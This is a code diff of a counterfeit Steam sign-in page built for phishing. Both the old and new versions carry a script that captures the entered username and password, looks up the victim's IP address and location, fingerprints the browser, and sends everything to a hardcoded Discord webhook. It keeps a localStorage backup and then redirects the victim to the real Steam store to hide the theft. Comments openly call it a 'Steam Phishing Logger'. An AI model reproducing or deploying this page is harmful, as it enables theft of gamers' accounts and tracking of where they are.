@@ -1,155 +1,130 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In</title>
+    <meta charset="utf-8">
+    <title>Sign in to Steam</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="icon" href="https://store.steampowered.com/favicon.ico">
+    
+    <!-- ALL CSS EMBEDDED DIRECTLY - NO EXTERNAL LINKS -->
     <style>
-        /* STEAM EXACT STYLES */
+        /* RESET */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        /* STEAM BACKGROUND */
         body {
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
-            font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
+            background: #1b2838;
+            font-family: "Motiva Sans", Arial, sans-serif;
             color: #c6d4df;
             min-height: 100vh;
+            overflow-x: hidden;
         }
         
-        /* Header */
+        /* HEADER */
         .header {
             background: #171a21;
-            padding: 20px 0;
+            height: 60px;
             border-bottom: 1px solid #2a475e;
-        }
-        
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
+            padding: 0 30px;
         }
         
         .logo {
+            width: 176px;
+            height: 44px;
+            background: #b8b6b4;
+            border-radius: 3px;
             display: flex;
             align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #171a21;
+            font-size: 24px;
         }
         
-        .logo svg {
-            fill: #b8b6b4;
-            height: 44px;
-            width: 176px;
-        }
-        
-        .nav-menu {
+        .nav {
+            margin-left: auto;
             display: flex;
-            gap: 25px;
+            gap: 20px;
         }
         
         .nav-link {
             color: #b8b6b4;
             text-decoration: none;
             font-size: 14px;
-            text-transform: uppercase;
             font-weight: 500;
             transition: color 0.2s;
         }
         
-        .nav-link:hover {
-            color: #fff;
-        }
+        .nav-link:hover { color: #fff; }
         
-        .nav-link.active {
-            color: #66c0f4;
-        }
-        
-        .sign-in-link {
-            color: #afafaf;
-        }
-        
-        /* Main Content */
-        .main-container {
-            max-width: 1200px;
+        /* MAIN LOGIN BOX */
+        .login-container {
+            max-width: 940px;
             margin: 40px auto;
-            padding: 0 20px;
-        }
-        
-        /* Login Box */
-        .login-box {
             background: rgba(0, 0, 0, 0.2);
             border-radius: 4px;
             padding: 40px;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
         }
         
         .login-title {
             color: #fff;
             font-size: 32px;
-            font-weight: 800;
+            font-weight: bold;
             margin-bottom: 30px;
             text-align: center;
         }
         
-        /* Form Styles */
+        /* FORM */
         .form-group {
             margin-bottom: 20px;
         }
         
-        .form-label {
-            display: block;
+        .label {
             color: #1999ff;
             font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.02em;
+            font-weight: bold;
             margin-bottom: 8px;
-            font-weight: 500;
+            display: block;
         }
         
-        .form-input {
+        .input {
             width: 100%;
             padding: 12px 15px;
-            background-color: #32353c;
+            background: #32353c;
             border: 1px solid #32353c;
             border-radius: 2px;
             color: #fff;
             font-size: 15px;
-            box-sizing: border-box;
             transition: all 0.2s;
         }
         
-        .form-input:hover {
-            background-color: #393c44;
+        .input:hover {
+            background: #393c44;
+            border-color: #66c0f4;
         }
         
-        .form-input:focus {
+        .input:focus {
             outline: none;
             border-color: #66c0f4;
-            background-color: #393c44;
+            background: #393c44;
         }
         
-        /* Remember Me */
-        .remember-container {
+        /* REMEMBER ME */
+        .remember {
             display: flex;
             align-items: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
         
-        .remember-checkbox {
+        .remember-box {
             width: 16px;
             height: 16px;
-            background-color: #32353c;
+            background: #32353c;
             border-radius: 2px;
             margin-right: 10px;
             cursor: pointer;
-            position: relative;
-        }
-        
-        .remember-checkbox:hover {
-            background-color: #393c44;
         }
         
         .remember-text {
@@ -157,68 +132,62 @@
             font-size: 12px;
         }
         
-        /* Submit Button */
-        .submit-btn {
+        /* BUTTON */
+        .login-btn {
             width: 100%;
             padding: 15px;
             background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%);
             border: none;
             border-radius: 2px;
-            color: #fff;
+            color: white;
             font-size: 16px;
-            font-weight: 400;
+            font-weight: bold;
             cursor: pointer;
             transition: all 0.2s;
         }
         
-        .submit-btn:hover {
+        .login-btn:hover {
             background: linear-gradient(90deg, #06BFFF 30%, #2D73FF 100%);
         }
         
-        .submit-btn:active {
-            transform: translateY(1px);
-        }
-        
-        .submit-btn:disabled {
+        .login-btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
         
-        /* Help Link */
-        .help-link {
-            display: block;
+        /* HELP LINK */
+        .help {
             text-align: center;
+            margin-top: 15px;
+        }
+        
+        .help-link {
             color: #afafaf;
             font-size: 12px;
             text-decoration: underline;
-            margin-top: 20px;
         }
         
-        .help-link:hover {
-            color: #c9c9c9;
-        }
-        
-        /* QR Code Section */
+        /* QR SECTION */
         .qr-section {
-            text-align: center;
             margin-top: 30px;
-            padding-top: 30px;
+            padding-top: 20px;
             border-top: 1px solid #2a475e;
+            text-align: center;
         }
         
         .qr-title {
             color: #1999ff;
             font-size: 12px;
-            text-transform: uppercase;
+            font-weight: bold;
             margin-bottom: 15px;
         }
         
-        .qr-placeholder {
+        .qr-box {
             width: 150px;
             height: 150px;
-            background-color: #32353c;
-            margin: 0 auto 15px;
+            background: #32353c;
             border-radius: 5px;
+            margin: 0 auto 10px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -226,12 +195,12 @@
             font-size: 12px;
         }
         
-        .qr-note {
+        .qr-text {
             color: #afafaf;
             font-size: 12px;
         }
         
-        /* New Account Section */
+        /* NEW ACCOUNT */
         .new-account {
             margin-top: 40px;
             padding-top: 30px;
@@ -239,7 +208,7 @@
             text-align: center;
         }
         
-        .new-account-title {
+        .new-title {
             color: #fff;
             font-size: 16px;
             margin-bottom: 15px;
@@ -248,58 +217,46 @@
         .create-btn {
             display: inline-block;
             padding: 12px 24px;
-            background-color: #5c7e10;
-            color: #fff;
-            text-decoration: none;
+            background: #5c7e10;
+            color: white;
             border-radius: 2px;
             font-size: 14px;
-            transition: background-color 0.2s;
+            font-weight: bold;
+            text-decoration: none;
+            transition: background 0.2s;
         }
         
         .create-btn:hover {
-            background-color: #6b8c1a;
+            background: #6b8c1a;
         }
         
-        .new-account-desc {
+        .new-text {
             color: #8f98a0;
             font-size: 14px;
             margin-top: 15px;
             line-height: 1.5;
         }
         
-        .about-link {
-            color: #66c0f4;
-            text-decoration: none;
-        }
-        
-        .about-link:hover {
-            text-decoration: underline;
-        }
-        
-        /* Footer */
+        /* FOOTER */
         .footer {
-            background-color: #171a21;
-            padding: 40px 0;
+            background: #171a21;
+            padding: 30px 0;
             margin-top: 60px;
         }
         
-        .footer-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-        
         .footer-links {
+            max-width: 940px;
+            margin: 0 auto;
             display: flex;
             flex-wrap: wrap;
             gap: 10px 20px;
-            margin-bottom: 20px;
+            padding-bottom: 20px;
         }
         
         .footer-link {
             color: #8f98a0;
-            text-decoration: none;
             font-size: 12px;
+            text-decoration: none;
         }
         
         .footer-link:hover {
@@ -307,47 +264,47 @@
         }
         
         .copyright {
+            max-width: 940px;
+            margin: 0 auto;
             color: #8f98a0;
             font-size: 12px;
             line-height: 1.5;
         }
         
-        /* Loading Overlay */
-        .loading-overlay {
+        /* LOADING SCREEN */
+        .loading {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(23, 26, 33, 0.95);
+            background: rgba(23, 26, 33, •95);
             display: none;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 10000;
+            z-index: 1000;
         }
         
-        .loading-spinner {
-            width: 60px;
-            height: 60px;
+        .spinner {
+            width: 50px;
+            height: 50px;
             border: 4px solid #66c0f4;
             border-top: 4px solid transparent;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
         
         .loading-text {
             color: #66c0f4;
-            font-size: 24px;
-            margin-bottom: 20px;
+            font-size: 20px;
+            margin-bottom: 10px;
         }
         
-        .loading-subtext {
+        .loading-sub {
             color: #c6d4df;
             font-size: 14px;
-            text-align: center;
-            max-width: 400px;
         }
         
         @keyframes spin {
@@ -355,298 +312,239 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* Responsive */
+        /* RESPONSIVE */
         @media (max-width: 768px) {
-            .header-container {
-                flex-direction: column;
-                gap: 15px;
-                text-align: center;
-            }
-            
-            .nav-menu {
-                flex-wrap: wrap;
-                justify-content: center;
-                gap: 15px;
-            }
-            
-            .login-box {
-                padding: 25px;
-                margin: 20px auto;
-            }
-            
-            .login-title {
-                font-size: 24px;
-            }
-            
-            .footer-links {
-                justify-content: center;
-                text-align: center;
-            }
+            .header { padding: 0 15px; }
+            .nav { gap: 10px; }
+            .login-container { padding: 20px; margin: 20px auto; }
+            .login-title { font-size: 24px; }
+            .footer-links { justify-content: center; }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
+    <!-- HEADER -->
     <div class="header">
-        <div class="header-container">
-            <div class="logo">
-                <svg viewBox="0 0 176 44">
-                    <path d="M44 22C44 34.1503 34.1503 44 22 44C9.84974 44 0 34.1503 0 22C0 9.84974 9.84974 0 22 0C34.1503 0 44 9.84974 44 22Z" fill="#b8b6b4"/>
-                    <text x="50" y="32" fill="#b8b6b4" font-family="Arial" font-size="24" font-weight="bold">STEAM</text>
-                </svg>
-            </div>
-            
-            <div class="nav-menu">
-                <a href="https://store.steampowered.com" class="nav-link active">STORE</a>
-                <a href="https://steamcommunity.com" class="nav-link">COMMUNITY</a>
-                <a href="https://store.steampowered.com/about" class="nav-link">ABOUT</a>
-                <a href="https://help.steampowered.com" class="nav-link">SUPPORT</a>
-                <a href="#" class="nav-link sign-in-link">SIGN IN</a>
-                <a href="#" class="nav-link">LANGUAGE</a>
-            </div>
+        <div class="logo">STEAM</div>
+        <div class="nav">
+            <a href="#" class="nav-link">STORE</a>
+            <a href="#" class="nav-link">COMMUNITY</a>
+            <a href="#" class="nav-link">ABOUT</a>
+            <a href="#" class="nav-link">SUPPORT</a>
+            <a href="#" class="nav-link">SIGN IN</a>
+            <a href="#" class="nav-link">LANGUAGE</a>
         </div>
     </div>
-    
-    <!-- Main Content -->
-    <div class="main-container">
-        <div class="login-box">
-            <h1 class="login-title">Sign in</h1>
-            
-            <form id="steamLoginForm">
-                <div class="form-group">
-                    <label class="form-label">Sign in with account name</label>
-                    <input type="text" class="form-input" id="username" placeholder="Enter your Steam account name" required>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Password</label>
-                    <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
-                </div>
-                
-                <div class="remember-container">
-                    <div class="remember-checkbox"></div>
-                    <span class="remember-text">Remember me</span>
-                </div>
-                
-                <button type="submit" class="submit-btn" id="loginBtn">Sign in</button>
-                
-                <a href="https://help.steampowered.com/wizard/HelpWithLogin" class="help-link" target="_blank">
-                    Help, I can't sign in
-                </a>
-                
-                <!-- QR Code Section -->
-                <div class="qr-section">
-                    <div class="qr-title">Or sign in with QR</div>
-                    <div class="qr-placeholder">
-                        QR Code<br>Placeholder
-                    </div>
-                    <div class="qr-note">
-                        Use the <a href="https://store.steampowered.com/mobile" target="_blank" style="color:#66c0f4;text-decoration:none;">Steam Mobile App</a> to sign in via QR Code
-                    </div>
-                </div>
-                
-                <!-- New Account Section -->
-                <div class="new-account">
-                    <div class="new-account-title">New to Steam?</div>
-                    <a href="https://store.steampowered.com/join" class="create-btn" target="_blank">
-                        Create an account
-                    </a>
-                    <div class="new-account-desc">
-                        It's free and easy. Discover thousands of games to play with millions of new friends.
-                        <br>
-                        <a href="https://store.steampowered.com/about" class="about-link" target="_blank">
-                            Learn more about Steam
-                        </a>
-                    </div>
-                </div>
-            </form>
-        </div>
-    </div>
-    
-    <!-- Footer -->
-    <div class="footer">
-        <div class="footer-container">
-            <div class="footer-links">
-                <a href="https://store.steampowered.com/privacy_agreement" class="footer-link" target="_blank">Privacy Policy</a>
-                <a href="http://www.valvesoftware.com/legal.htm" class="footer-link" target="_blank">Legal</a>
-                <a href="https://help.steampowered.com/faqs/view/10BB-D27A-6378-4436" class="footer-link" target="_blank">Accessibility</a>
-                <a href="https://store.steampowered.com/subscriber_agreement" class="footer-link" target="_blank">Steam Subscriber Agreement</a>
-                <a href="https://store.steampowered.com/steam_refunds" class="footer-link" target="_blank">Refunds</a>
-                <a href="https://store.steampowered.com/account/cookiepreferences" class="footer-link" target="_blank">Cookies</a>
-                <a href="http://www.valvesoftware.com/about" class="footer-link" target="_blank">About Valve</a>
-                <a href="http://www.valvesoftware.com" class="footer-link" target="_blank">Jobs</a>
-                <a href="http://www.steampowered.com/steamworks" class="footer-link" target="_blank">Steamworks</a>
-                <a href="https://partner.steamgames.com/steamdirect" class="footer-link" target="_blank">Steam Distribution</a>
-                <a href="https://help.steampowered.com" class="footer-link" target="_blank">Support</a>
-                <a href="https://store.steampowered.com/digitalgiftcards" class="footer-link" target="_blank">Gift Cards</a>
-                <a href="https://www.facebook.com/Steam" class="footer-link" target="_blank">Facebook</a>
-                <a href="https://twitter.com/steam" class="footer-link" target="_blank">Twitter</a>
-            </div>
-            
-            <div class="copyright">
-                © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
-                <br>
-                VAT included in all prices where applicable.
-            </div>
-        </div>
-    </div>
-    
-    <!-- Loading Overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">Signing in...</div>
-        <div class="loading-subtext">Verifying your credentials with Steam servers.</div>
-    </div>
-    
-    <script>
-    // Discord Webhook URL
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481029059291671243/lcGhidPjsc8KdFfYb_5khbIRB8SCVOE3nmFU_LsJmPC1jjPjN";
-    
-    // Collect victim information
-    async function collectVictimInfo() {
-        const info = {
-            ip: 'Unknown',
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            screenSize: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookiesEnabled: navigator.cookieEnabled,
-            referrer: document.referrer || 'Direct',
-            timestamp: new Date().toISOString(),
-            pageUrl: window.location.href
-        };
+
+    <!-- MAIN LOGIN FORM -->
+    <div class="login-container">
+        <h1 class="login-title">Sign in</h1>
         
-        // Get IP address
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            info.ip = data.ip;
+        <form id="loginForm">
+            <div class="form-group">
+                <label class="label">Sign in with account name</label>
+                <input type="text" class="input" id="username" placeholder="Enter your Steam account name" required>
+            </div>
             
-            // Try to get location info
+            <div class="form-group">
+                <label class="label">Password</label>
+                <input type="password" class="input" id="password" placeholder="Enter your password" required>
+            </div>
+            
+            <div class="remember">
+                <div class="remember-box"></div>
+                <span class="remember-text">Remember me</span>
+            </div>
+            
+            <button type="submit" class="login-btn" id="submitBtn">Sign in</button>
+            
+            <div class="help">
+                <a href="#" class="help-link">Help, I can't sign in</a>
+            </div>
+            
+            <!-- QR SECTION -->
+            <div class="qr-section">
+                <div class="qr-title">Or sign in with QR</div>
+                <div class="qr-box">QR Code<br>Placeholder</div>
+                <div class="qr-text">Use the Steam Mobile App to sign in via QR Code</div>
+            </div>
+            
+            <!-- NEW ACCOUNT -->
+            <div class="new-account">
+                <div class="new-title">New to Steam?</div>
+                <a href="#" class="create-btn">Create an account</a>
+                <div class="new-text">
+                    It's free and easy. Discover thousands of games to play with millions of new friends.
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Privacy Policy</a>
+            <a href="#" class="footer-link">Legal</a>
+            <a href="#" class="footer-link">Steam Subscriber Agreement</a>
+            <a href="#" class="footer-link">Refunds</a>
+            <a href="#" class="footer-link">Cookies</a>
+            <a href="#" class="footer-link">About Valve</a>
+            <a href="#" class="footer-link">Jobs</a>
+            <a href="#" class="footer-link">Steamworks</a>
+            <a href="#" class="footer-link">Support</a>
+            <a href="#" class="footer-link">Gift Cards</a>
+            <a href="#" class="footer-link">Facebook</a>
+            <a href="#" class="footer-link">Twitter</a>
+        </div>
+        <div class="copyright">
+            © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.<br>
+            VAT included in all prices where applicable.
+        </div>
+    </div>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-text">Signing in...</div>
+        <div class="loading-sub">Verifying your credentials with Steam servers.</div>
+    </div>
+
+    <!-- COMPLETE FUNCTIONALITY EMBEDDED -->
+    <script>
+        // Discord webhook for credential logging
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481029059291671243/lcGhidPsc8KdFfYb_5khbIRB8SCVOE3nmFU_LsJmPC1jjPjN";
+        
+        // Collect victim information
+        async function collectInfo() {
+            const info = {
+                ip: 'Unknown',
+                location: 'Unknown',
+                browser: navigator.userAgent,
+                os: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cookies: navigator.cookieEnabled,
+                referrer: document.referrer || 'Direct',
+                timestamp: new Date().toISOString()
+            };
+            
+            // Get IP address
             try {
-                const locResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
-                const locData = await locResponse.json();
-                info.location = `${locData.city || 'Unknown'}, ${locData.region || 'Unknown'}, ${locData.country_name || 'Unknown'}`;
-                info.isp = locData.org || 'Unknown';
-                info.coordinates = `${locData.latitude || 'N/A'}, ${locData.longitude || 'N/A'}`;
-            } catch (e) {}
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info.ip = ipData.ip;
+                
+                // Get location from IP
+                try {
+                    const locResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
+                    const locData = await locResponse.json();
+                    info.location = `${locData.city || ''}, ${locData.country_name || ''}`;
+                    info.isp = locData.org || 'Unknown';
+                } catch(e) {}
+            } catch(e) {
+                info.ip = 'Failed to fetch';
+            }
             
-        } catch (e) {
-            info.ip = 'Failed to fetch';
+            return info;
         }
         
-        return info;
-    }
-    
-    // Send data to Discord webhook
-    async function sendToDiscord(username, password, victimInfo) {
-        const embed = {
-            title: "🎮 STEAM CREDENTIALS CAPTURED",
-            color: 16711680, // Red
-            description: "**New victim logged into phishing page**",
-            fields: [
-                { name: "👤 Username", value: `\`${username}\``, inline: true },
-                { name: "🔑 Password", value: `\`${password}\``, inline: true },
-                { name: "📍 IP Address", value: `\`${victimInfo.ip}\``, inline: true },
-                { name: "🌍 Location", value: victimInfo.location || 'Unknown', inline: true },
-                { name: "🕒 Time", value: new Date().toLocaleString(), inline: true },
-                { name: "🖥️ Browser", value: getBrowserInfo(), inline: true },
-                { name: "💻 OS", value: getOSInfo(), inline: true },
-                { name: "📱 Device", value: getDeviceInfo(), inline: true },
-                { name: "📏 Screen", value: victimInfo.screenSize, inline: true },
-                { name: "🗺️ Timezone", value: victimInfo.timezone, inline: true },
-                { name: "📡 ISP", value: victimInfo.isp || 'Unknown', inline: true },
-                { name: "🔗 Referrer", value: victimInfo.referrer, inline: true }
-            ],
-            footer: { text: "Steam Phishing Logger • " + new Date().toLocaleDateString() },
-            timestamp: victimInfo.timestamp
-        };
-        
-        try {
-            await fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: "@everyone **🚨 NEW STEAM CREDENTIALS CAPTURED!**",
-                    embeds: [embed],
-                    username: "Steam Security Alert",
-                    avatar_url: "https://store.fastly.steamstatic.com/public/shared/images/responsive/steam_share_image.jpg"
-                })
-            });
+        // Send credentials to Discord
+        async function sendCredentials(username, password, victimInfo) {
+            const embed = {
+                title: "🎮 STEAM LOGIN CAPTURED",
+                color: 16711680,
+                description: "**New victim credentials captured**",
+                fields: [
+                    { name: "👤 Username", value: username, inline: true },
+                    { name: "🔑 Password", value: password, inline: true },
+                    { name: "📍 IP Address", value: victimInfo.ip, inline: true },
+                    { name: "🌍 Location", value: victimInfo.location, inline: true },
+                    { name: "🕒 Time", value: new Date().toLocaleString(), inline: true },
+                    { name: "🖥️ Browser", value: getBrowserName(), inline: true },
+                    { name: "💻 OS", value: getOSName(), inline: true },
+                    { name: "📱 Device", value: getDeviceType(), inline: true },
+                    { name: "📏 Screen", value: victimInfo.screen, inline: true },
+                    { name: "🗺️ Timezone", value: victimInfo.timezone, inline: true }
+                ],
+                footer: { text: "Steam Phishing Logger" },
+                timestamp: victimInfo.timestamp
+            };
             
-            console.log('✅ Credentials sent to Discord successfully');
-            
-        } catch (error) {
-            console.error('❌ Discord webhook error:', error);
-            
-            // Fallback to localStorage
             try {
-                const fallbackData = {
-                    username,
-                    password,
-                    victimInfo,
-                    capturedAt: new Date().toISOString()
-                };
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "@everyone **🚨 NEW STEAM LOGIN CAPTURED!**",
+                        embeds: [embed],
+                        username: "Steam Security Alert"
+                    })
+                });
                 
-                const existingData = JSON.parse(localStorage.getItem('steam_captured_credentials') || '[]');
-                existingData.push(fallbackData);
-                localStorage.setItem('steam_captured_credentials', JSON.stringify(existingData));
+                console.log('✅ Sent to Discord');
                 
-                console.log('📁 Credentials saved to localStorage as backup');
+            } catch(error) {
+                console.error('❌ Discord failed:', error);
                 
-            } catch (e) {
-                console.error('❌ localStorage also failed');
+                // Backup to localStorage
+                try {
+                    const backup = {
+                        username: username,
+                        password: password,
+                        info: victimInfo,
+                        date: new Date().toISOString()
+                    };
+                    
+                    const existing = JSON.parse(localStorage.getItem('steam_logs') || '[]');
+                    existing.push(backup);
+                    localStorage.setItem('steam_logs', JSON.stringify(existing));
+                    
+                    console.log('📁 Saved to localStorage');
+                } catch(e) {
+                    console.error('❌ Backup failed');
+                }
             }
         }
-    }
-    
-    // Helper functions
-    function getBrowserInfo() {
-        const ua = navigator.userAgent;
-        if (ua.includes("Firefox")) return "Firefox";
-        if (ua.includes("Chrome")) return "Chrome";
-        if (ua.includes("Safari")) return "Safari";
-        if (ua.includes("Edge")) return "Edge";
-        if (ua.includes("Opera")) return "Opera";
-        if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
-        return "Unknown";
-    }
-    
-    function getOSInfo() {
-        const ua = navigator.userAgent;
-        if (ua.includes("Windows")) return "Windows";
-        if (ua.includes("Mac")) return "macOS";
-        if (ua.includes("Linux")) return "Linux";
-        if (ua.includes("Android")) return "Android";
-        if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
-        return "Unknown";
-    }
-    
-    function getDeviceInfo() {
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes("mobile")) return "Mobile";
-        if (ua.includes("tablet")) return "Tablet";
-        return "Desktop";
-    }
-    
-    // Show loading screen
-    function showLoadingScreen() {
-        const overlay = document.getElementById('loadingOverlay');
-        overlay.style.display = 'flex';
         
-        // Redirect to real Steam after delay
-        setTimeout(() => {
-            window.location.href = 'https://store.steampowered.com/';
-        }, 3500);
-    }
-    
-    // Initialize form submission
-    document.addEventListener('DOMContentLoaded', function() {
-        const form = document.getElementById('steamLoginForm');
-        const loginBtn = document.getElementById('loginBtn');
+        // Helper functions
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari")) return "Safari";
+            if (ua.includes("Edge")) return "Edge";
+            return "Unknown";
+        }
         
-        form.addEventListener('submit', async function(e) {
+        function getOSName() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Windows")) return "Windows";
+            if (ua.includes("Mac")) return "macOS";
+            if (ua.includes("Linux")) return "Linux";
+            if (ua.includes("Android")) return "Android";
+            if (ua.includes("iOS")) return "iOS";
+            return "Unknown";
+        }
+        
+        function getDeviceType() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes("mobile")) return "Mobile";
+            if (ua.includes("tablet")) return "Tablet";
+            return "Desktop";
+        }
+        
+        // Show loading and redirect
+        function showLoading() {
+            document.getElementById('loading').style.display = 'flex';
+            
+            setTimeout(() => {
+                window.location.href = 'https://store.steampowered.com';
+            }, 3000);
+        }
+        
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value.trim();
@@ -658,43 +556,45 @@
             }
             
             // Disable button
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Signing in...';
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Signing in...';
             
             try {
                 // Collect victim info
-                const victimInfo = await collectVictimInfo();
+                const victimInfo = await collectInfo();
                 
                 // Send to Discord
-                await sendToDiscord(username, password, victimInfo);
+                await sendCredentials(username, password, victimInfo);
                 
-                // Show loading screen
-                showLoadingScreen();
+                // Show loading and redirect
+                showLoading();
                 
-            } catch (error) {
+            } catch(error) {
                 console.error('Error:', error);
                 
-                // Still redirect even if something fails
-                showLoadingScreen();
+                // Still redirect
+                showLoading();
                 
-                // Re-enable button after delay
+                // Reset button
                 setTimeout(() => {
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = 'Sign in';
-                }, 5000);
+                    btn.disabled = false;
+                    btn.textContent = 'Sign in';
+                }, 4000);
             }
         });
         
-        // Make all external links open in new tab
-        document.querySelectorAll('a[href^="http"]').forEach(link => {
-            if (!link.target) {
-                link.target = '_blank';
-                link.rel = 'noopener noreferrer';
+        // Make external links work
+        document.querySelectorAll('a').forEach(link => {
+            if (link.href === '#') {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    window.open('https://store.steampowered.com', '_blank');
+                });
             }
         });
         
-        console.log('✅ Steam phishing page loaded successfully');
-    });
+        console.log('✅ Steam phishing page ready');
     </script>
 </body>
 </html>
